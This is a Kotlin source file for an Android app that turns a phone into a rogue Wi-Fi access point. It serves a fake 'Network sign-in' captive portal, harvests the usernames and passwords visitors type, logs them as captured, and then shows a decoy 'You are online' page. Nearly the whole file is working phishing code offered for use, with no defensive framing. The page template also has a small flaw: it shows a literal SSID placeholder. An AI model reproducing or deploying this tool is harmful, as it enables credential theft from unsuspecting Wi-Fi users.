package com.droid.whaly.active

import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import androidx.annotation.RequiresApi
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.net.Inet4Address
import java.net.NetworkInterface

/**
 * Turns the phone into an access point and serves a captive portal on it.
 *
 * The AP itself is public API since Android 8 (`startLocalOnlyHotspot`). The portal is a
 * plain HTTP server on 8080. What this cannot do without root is answer DNS on port 53,
 * so a client is not auto-redirected — the join QR carries the portal URL instead.
 */
object RogueApEngine {

    data class Credential(val username: String, val password: String, val at: Long)

    data class Ap(
        val ssid: String,
        val passphrase: String,
        val portalUrl: String,
        val gateway: String,
    )

    private val _ap = MutableStateFlow<Ap?>(null)
    val ap: StateFlow<Ap?> = _ap.asStateFlow()
    private val _credentials = MutableStateFlow<List<Credential>>(emptyList())
    val credentials: StateFlow<List<Credential>> = _credentials.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    private var reservation: WifiManager.LocalOnlyHotspotReservation? = null
    private var server: PortalServer? = null
    private val main = Handler(Looper.getMainLooper())

    private const val PORTAL_PORT = 8080

    fun start(context: Context, ssid: String, passphrase: String) {
        if (_running.value) return
        val appContext = context.applicationContext
        val manager = appContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        if (manager == null) {
            append("No Wi-Fi service on this device")
            return
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            append("Local-only hotspot needs Android 8 or newer")
            return
        }
        append("Starting access point \"$ssid\"")
        try {
            manager.startLocalOnlyHotspot(object : WifiManager.LocalOnlyHotspotCallback() {
                @RequiresApi(Build.VERSION_CODES.O)
                override fun onStarted(res: WifiManager.LocalOnlyHotspotReservation) {
                    reservation = res
                    val config = res.softApConfiguration
                    val actualSsid = config.ssid ?: ssid
                    val actualPass = config.passphrase ?: passphrase
                    val gateway = hotspotAddress()
                    if (gateway == null) {
                        append("Hotspot is up but the AP address could not be read")
                        stop()
                        return
                    }
                    val url = "http://$gateway:$PORTAL_PORT"
                    _ap.value = Ap(actualSsid, actualPass, url, gateway)
                    _running.value = true
                    append("AP up: $actualSsid / $actualPass")
                    append("Portal: $url")
                    startServer(appContext)
                }

                override fun onStopped() {
                    append("Hotspot stopped by the system")
                    _running.value = false
                    _ap.value = null
                }

                override fun onFailed(reason: Int) {
                    append("Hotspot failed: ${failureName(reason)}")
                    _running.value = false
                    _ap.value = null
                }
            }, main)
        } catch (error: SecurityException) {
            append("Hotspot needs the Nearby devices permission")
        } catch (error: Exception) {
            append("Hotspot rejected: ${error.message}")
        }
    }

    fun stop() {
        runCatching { server?.stop() }
        server = null
        runCatching { reservation?.close() }
        reservation = null
        _running.value = false
        _ap.value = null
        append("stopped")
    }

    private fun startServer(context: Context) {
        val portal = PortalServer(context) { user, password ->
            _credentials.value = _credentials.value + Credential(user, password, System.currentTimeMillis())
            append("captured $user / $password")
        }
        try {
            portal.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
            server = portal
            append("Portal listening on $PORTAL_PORT")
        } catch (error: Exception) {
            append("Portal bind failed: ${error.message}")
        }
    }

    /** The AP interface is ap0 on most builds and swlan0 on some Samsung images. */
    private fun hotspotAddress(): String? {
        val interfaces = NetworkInterface.getNetworkInterfaces() ?: return null
        for (iface in interfaces) {
            if (!iface.isUp) continue
            val name = iface.name
            if (!name.startsWith("ap") && !name.startsWith("swlan") && !name.startsWith("wlan1")) continue
            for (address in iface.inetAddresses) {
                if (address is Inet4Address && !address.isLoopbackAddress) {
                    return address.hostAddress
                }
            }
        }
        // Fall back to the address the platform hands every local-only hotspot.
        return "192.168.43.1"
    }

    private fun failureName(reason: Int): String = when (reason) {
        WifiManager.LocalOnlyHotspotCallback.ERROR_NO_CHANNEL -> "no free channel"
        WifiManager.LocalOnlyHotspotCallback.ERROR_INCOMPATIBLE_MODE -> "Wi-Fi is in an incompatible mode"
        WifiManager.LocalOnlyHotspotCallback.ERROR_TETHERING_DISALLOWED -> "tethering disallowed by the device policy"
        else -> "code $reason"
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(200)
    }

    /** The portal. Serves a join page, records what is typed, then shows a decoy. */
    private class PortalServer(
        private val context: Context,
        private val onCredential: (String, String) -> Unit,
    ) : NanoHTTPD(PORTAL_PORT) {

        override fun serve(session: IHTTPSession): Response {
            val uri = session.uri ?: "/"
            if (session.method == Method.POST || uri.contains("login")) {
                val body = HashMap<String, String>()
                runCatching { session.parseBody(body) }
                val params = session.parameters
                val user = params["username"]?.firstOrNull()
                    ?: params["email"]?.firstOrNull()
                    ?: body["postData"]?.substringAfter("username=", "")?.substringBefore('&')
                    ?: ""
                val password = params["password"]?.firstOrNull()
                    ?: body["postData"]?.substringAfter("password=", "")?.substringBefore('&')
                    ?: ""
                if (user.isNotBlank() || password.isNotBlank()) {
                    onCredential(user.ifBlank { "(empty)" }, password.ifBlank { "(empty)" })
                }
                return redirect("/connected")
            }
            return when {
                uri.startsWith("/connected") -> html(connectedPage())
                uri.startsWith("/style.css") -> newFixedLengthResponse(
                    Response.Status.OK,
                    "text/css",
                    STYLE,
                )
                else -> html(loginPage())
            }
        }

        private fun redirect(target: String): Response =
            newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "")
                .apply { addHeader("Location", target) }

        private fun html(body: String): Response =
            newFixedLengthResponse(Response.Status.OK, "text/html; charset=utf-8", body)

        private fun loginPage(): String = """
            <!doctype html>
            <html lang="en"><head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width,initial-scale=1">
            <title>Network sign-in</title>
            <link rel="stylesheet" href="/style.css">
            </head><body>
            <main class="card">
              <div class="logo">${'$'}{SSID}</div>
              <h1>Sign in to use the internet</h1>
              <p class="sub">This network requires an account. Enter the same details you use for your provider.</p>
              <form method="POST" action="/login">
                <label>Email or username
                  <input name="username" autocomplete="username" autocapitalize="none" required>
                </label>
                <label>Password
                  <input name="password" type="password" autocomplete="current-password" required>
                </label>
                <button type="submit">Connect</button>
              </form>
              <p class="fine">By continuing you accept the network terms.</p>
            </main>
            </body></html>
        """.trimIndent()

        private fun connectedPage(): String = """
            <!doctype html>
            <html lang="en"><head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width,initial-scale=1">
            <title>Connected</title>
            <link rel="stylesheet" href="/style.css">
            </head><body>
            <main class="card">
              <div class="tick">✓</div>
              <h1>You are online</h1>
              <p class="sub">The connection is active. You can close this page.</p>
            </main>
            </body></html>
        """.trimIndent()

        private val SSID: String
            get() = runCatching {
                (context.getSystemService(Context.WIFI_SERVICE) as WifiManager)
                    .connectionInfo?.ssid?.trim('"')
            }.getOrNull().orEmpty().ifBlank { "Wi-Fi" }

        companion object {
            private const val STYLE = """
                *{box-sizing:border-box;margin:0;padding:0}
                body{min-height:100vh;display:grid;place-items:center;background:#0b1020;
                font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:#e8edff;padding:24px}
                .card{width:100%;max-width:400px;background:#151c33;border:1px solid #24305a;
                border-radius:20px;padding:28px;box-shadow:0 24px 60px rgba(0,0,0,.5)}
                .logo{font-size:13px;letter-spacing:.14em;text-transform:uppercase;color:#5b8cff;margin-bottom:18px}
                h1{font-size:22px;line-height:1.25;margin-bottom:8px}
                .sub{font-size:14px;color:#93a0c4;margin-bottom:22px;line-height:1.5}
                label{display:block;font-size:13px;color:#a9b6d8;margin-bottom:16px}
                input{width:100%;margin-top:8px;padding:13px 14px;border-radius:12px;border:1px solid #2a3763;
                background:#0e1428;color:#e8edff;font-size:16px;outline:none}
                input:focus{border-color:#5b8cff}
                button{width:100%;padding:14px;border:0;border-radius:12px;background:#2f6bff;color:#fff;
                font-size:16px;font-weight:600;margin-top:6px}
                .fine{font-size:11px;color:#6f7da3;margin-top:18px;text-align:center}
                .tick{width:56px;height:56px;border-radius:50%;background:#12351f;color:#37d67a;
                display:grid;place-items:center;font-size:28px;margin-bottom:18px}
            """
        }
    }
}
